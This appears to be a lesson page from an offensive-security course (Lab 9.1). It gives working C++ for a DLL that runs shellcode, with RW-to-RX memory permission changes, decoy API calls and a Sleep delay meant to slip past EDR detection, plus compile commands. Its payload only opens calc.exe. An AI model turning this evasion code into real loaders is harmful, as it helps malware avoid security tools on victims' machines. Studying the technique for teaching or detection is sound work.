---
showTableOfContents: true
title: "Decoupling, Delays, and Misdirections (Lab 9.1)"
type: "page"
---

## Goal

Let's take `calc_dll.cpp`, as we created in Lab 1.1, decouple RWX memory permissions and introduce some delay + decoys. Note the loader + server will be the exact same as we used in Lab 8.2, these files remained unchanged.


## Code: Implementing RW -> RX
All the changes will happen inside of our `ExecuteShellcode()` function.

```cpp
BOOL ExecuteShellcode() {
	DWORD oldProtect = 0; // Variable to store original permissions

    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE); // CHANGE THIS LINE

    if (exec_memory == NULL) {
        return FALSE;
    }

	// Changed RtlCopyMemory to memcpy
    memcpy(exec_memory, calc_shellcode, sizeof(calc_shellcode));

    // Change memory protection to RX before execution
    if (!VirtualProtect(exec_memory, sizeof(calc_shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        // Handle VirtualProtect error (e.g., print GetLastError())
        VirtualFree(exec_memory, 0, MEM_RELEASE); // Clean up allocated memory
        return FALSE;
    }

    void (*shellcode_func)() = (void(*)())exec_memory;

    shellcode_func();
    
    // (Optional but Recommended) Restore original permissions before freeing
    DWORD dummyProtect; // We don't care about the 'old' protection on this call
    VirtualProtect(exec_memory, sizeof(calc_shellcode), oldProtect, &dummyProtect);

    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE;
}
```

## Code Breakdown
- Right at the top we declare `oldProtect` to store our original permissions at the end.
- When we use VirtualAlloc, we now request memory that is `PAGE_READWRITE`
- Next, I changed the function we used to copy the shellcode into memory from `RtlCopyMemory` to `memcpy`, this is not required and has no effect, I just did it to show you that there are multiple options available to us.
- We then add a call to `VirtualProtect` *after* copying the shellcode but *before* executing it. This changes the page permissions to `PAGE_EXECUTE_READ`, allowing the CPU to execute the instructions stored there. We store the previous permissions (`PAGE_READWRITE`) in the `oldProtect` variable.
- Then, before we call `VirtualFree()` (as we did before), we restore our original memory permissions (`PAGE_READWRITE`). As explained in Theory 9.1, this is not required, but good practice.


## Code: Implementing Delays + Decoys
Once again all the changes happen inside of `ExecuteShellcode()` function, specifically between the points where we use `memcpy` to copy the shellcode into memory, and then change the permissions.

```cpp
BOOL ExecuteShellcode() {
	DWORD oldProtect = 0; // Variable to store original permissions

    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE); // CHANGE THIS LINE

    if (exec_memory == NULL) {
        return FALSE;
    }

	// Changed RtlCopyMemory to memcpy
    memcpy(exec_memory, calc_shellcode, sizeof(calc_shellcode));

	// --- Start Delay/Misdirection ---  
	  
	 // Misdirection: Call some common, low-impact APIs DWORD tickCount = GetTickCount();  
	 SYSTEMTIME sysTime;  
	 GetSystemTime(&sysTime);  
	  
	 // Delay: Pause execution for a short period  
	 Sleep(2000); // Sleep for 2 seconds (Adjust as needed)  
	  
	 // --- End Delay/Misdirection ---
 
    // Change memory protection to RX before execution
    if (!VirtualProtect(exec_memory, sizeof(calc_shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        // Handle VirtualProtect error (e.g., print GetLastError())
        VirtualFree(exec_memory, 0, MEM_RELEASE); // Clean up allocated memory
        return FALSE;
    }

    void (*shellcode_func)() = (void(*)())exec_memory;

    shellcode_func();
    
    // (Optional but Recommended) Restore original permissions before freeing
    DWORD dummyProtect; // We don't care about the 'old' protection on this call
    VirtualProtect(exec_memory, sizeof(calc_shellcode), oldProtect, &dummyProtect);

    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE;
}
```


## Code Breakdown
- We're just adding one extremely simply decoy function, and a 2-second delay.
- Note this single, simple decoy is unlikely to have much impact, but I just wanted to illustrate the principle - this is one of those areas you are free to get extremely creative with, so feel free to research other potential functions, combinations etc.



## Instructions
We'll need to recompile our DLL.

On Darwin (Mac OS):

```
x86_64-w64-mingw32-g++ calc_dll.cpp -o calc_dll.dll -shared -static-libgcc -static-libstdc++ -luser32
```

On Windows:

```
cl.exe /D_USRDLL /D_WINDLL calc_dll.cpp /link /DLL /OUT:calc_dll.dll
```

On Linux:

```
g++ -shared -o calc_dll.dll calc_dll.cpp -Wl,--out-implib,libcalc_dll.a
```


Then, follow the exact same instructions from Lab 8.2 - we'll once again run our server, and then the client/loader. The only difference now of course is that the server will serve this new dll with our delay + decoy functions.

## Results
The output should be unchanged from Lab 8.2, and following a 2-second delay we should once again have calc.exe pop-up. Our decoy function has no visible effect, remember this is all an attempt to foil detection behind the scenes by introduction some functional misdirection.

## Discussion
In theory these changes might have made some improvement to our chances of being detected. Now of course, the only way to detect that would have been in an environment with an EDR. That however is a lot of effort for something that is more than likely to fail, as I mentioned before I think there is educational value in exploring this process, even if there practical is dubious. You are however of course free to improve on the code here, introduce more dummy functions etc and test it in a live environment if you wish, just be aware that we have much better tricks up our sleeve which we'll explore in our upcoming modules.

## Conclusion
We've successfully refactored our shellcode execution. This serves as a solid foundation for the subsequent lessons in this module where we will explore further refinements and techniques for in-process evasion.

---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "delay.md" >}})
[|NEXT|]({{< ref "encrypt.md" >}})